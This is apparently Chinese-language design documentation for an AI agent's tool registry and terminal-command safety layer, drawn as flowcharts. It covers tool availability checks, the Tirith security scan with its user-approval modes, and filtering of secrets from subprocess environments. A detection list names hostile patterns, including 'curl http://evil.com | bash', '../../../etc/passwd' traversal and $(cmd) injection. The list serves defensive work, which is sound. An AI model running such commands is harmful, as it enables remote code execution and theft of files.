...
```mermaid
flowchart TD
    Start[开始] --> ImportModules[导入工具模块<br/>_discover_tools]
    
    ImportModules --> RegisterTools[触发 registry.register<br/>每个工具文件]
    
    RegisterTools --> GetDefinitions[调用 get_tool_definitions]
    
    GetDefinitions --> ResolveToolsets[解析工具集<br/>enabled/disabled_toolsets]
    
    ResolveToolsets --> CollectToolNames[收集工具名称列表]
    
    CollectToolNames --> RegistryGetDefs[registry.get_definitions<br/>tool_names]
    
    RegistryGetDefs --> CheckToolset{遍历每个工具<br/>检查可用性}
    
    CheckToolset --> HasCheckFn{有 check_fn?}
    HasCheckFn -->|是 | CallCheckFn[调用 check_fn]
    CallCheckFn --> CheckResult{check_fn<br/>返回 True?}
    ...
    NextTool -->|否 | ReturnSchemas[返回 schema 列表<br/>给 LLM]
    ...
    alt 工具不存在
        ...
        alt check_fn 返回 False
            ...
            alt terminal 工具
                ...
                Approval->>Approval: 综合检查<br/>(Tirith + 危险模式)
                ...
                alt 需要审批
                    ...
                    alt 已审批/YOLO 模式
                        ...
                        Approval-->>Terminal: {"approved": False,<br/>status: "approval_required"}
                        Terminal-->>Handler: 阻塞等待审批
                        Note over Approval: 用户审批:<br/>once/session/always/deny
...
│   │  自动安装机制                                                       │     │
│   │                                                                    │     │
│   │  1. 检查 PATH 中的 tirith 二进制                                    │     │
│   │  2. 未找到 → 后台线程下载 GitHub Release                           │     │
│   │  3. 验证: SHA-256 校验和 + cosign 签名验证 (可选)                   │     │
│   │  4. 安装到 $HERMES_HOME/bin/tirith                                 │     │
│   │  5. 失败持久化：~/.hermes/.tirith-install-failed (24h TTL)         │     │
│   └────────────────────────────────────────────────────────────────────┘     │
│                                   │                                          │
│                                   ▼                                          │
│   ┌────────────────────────────────────────────────────────────────────┐     │
...
│   │  Tirith 检测能力                                                    │     │
│   │                                                                    │     │
│   │  • Homograph URL 攻击 (西里文/希腊字母混淆)                         │     │
│   │  • 管道注入：curl http://evil.com | bash                           │     │
│   │  • 终端注入：ANSI 转义序列注入                                      │     │
│   │  • SSH 钓鱼：伪造主机密钥验证                                       │     │
│   │  • 代码执行：eval, exec, subprocess 注入                           │     │
│   │  • 文件路径遍历：../../../etc/passwd                               │     │
│   │  • 命令注入：$(cmd), `cmd`, ; cmd, | cmd                           │     │
│   └────────────────────────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────────────────────────┘
```
...
flowchart LR
    ...
    StoreInRegistry --> RegisterCheckFn[注册 check_fn 到<br/>_toolset_checks]
...
```mermaid
flowchart TD
    Start[get_tool_definitions<br/>enabled_toolsets] --> ResolveToolsets[resolve_toolset<br/>展开工具集]
    
    ResolveToolsets --> CollectNames[收集工具名称列表]
    
    CollectNames --> RegistryCall[registry.get_definitions<br/>tool_names]
    
    RegistryCall --> IterateTools{遍历工具}
    
    IterateTools --> GetEntry[获取 ToolEntry]
    
    GetEntry --> HasCheckFn{有 check_fn?}
    HasCheckFn -->|否 | Include[包含工具 schema]
    HasCheckFn -->|是 | CheckCache{已缓存?}
    
    CheckCache -->|是 | UseCached[使用缓存结果]
    CheckCache -->|否 | CallCheckFn[调用 check_fn]
    
    CallCheckFn --> CacheResult[缓存结果<br/>check_results[check_fn]]
    CacheResult --> CheckSuccess{check_fn<br/>返回 True?}
    
    CheckSuccess -->|是 | Include
    CheckSuccess -->|否 | Skip[跳过工具<br/>记录 debug 日志]
    
    UseCached --> CheckCachedResult{缓存结果<br/>为 True?}
    CheckCachedResult -->|是 | Include
    CheckCachedResult -->|否 | Skip
    
    Include --> NextTool{还有工具?}
    Skip --> NextTool
...
```mermaid
flowchart TD
    Start[terminal 工具调用] --> CheckEnv{env_type 是<br/>docker/singularity/<br/>modal/daytona?}
    
    CheckEnv -->|是 | SkipApproval[跳过审批<br/>直接执行]
    CheckEnv -->|否 | CheckYolo{YOLO 模式<br/>或 approvals.mode=off?}
    
    CheckYolo -->|是 | SkipApproval
    CheckYolo -->|否 | TirithScan[调用 Tirith 扫描<br/>check_command_security]
    ...
    CheckWarnings -->|有 | CheckApproved{检查会话/<br/>永久审批}
...
```mermaid
flowchart TD
    Start[构建子进程环境] --> IterateEnv[遍历 os.environ]
    
    IterateEnv --> CheckPassthrough{在 env_<br/>passthrough<br/>白名单?}
    
    CheckPassthrough -->|是 | Include[包含在 child_env]
    CheckPassthrough -->|否 | CheckSecret{包含 KEY/TOKEN/<br/>SECRET/PASSWORD/<br/>CREDENTIAL/AUTH?}
    
    CheckSecret -->|是 | Exclude[排除]
    CheckSecret -->|否 | CheckSafePrefix{以安全<br/>前缀开头?}
    
    CheckSafePrefix -->|是 | Include
    CheckSafePrefix -->|否 | Exclude
    
    Include --> NextVar{还有变量?}
    Exclude --> NextVar
    
    NextVar -->|是 | IterateEnv
    NextVar -->|否 | AddSpecial[添加特殊变量:<br/>HERMES_RPC_SOCKET<br/>PYTHONDONTWRITEBYTECODE<br/>PYTHONPATH<br/>TZ<br/>HOME (Profile 隔离)]
    
    AddSpecial --> Return[返回 child_env]
```
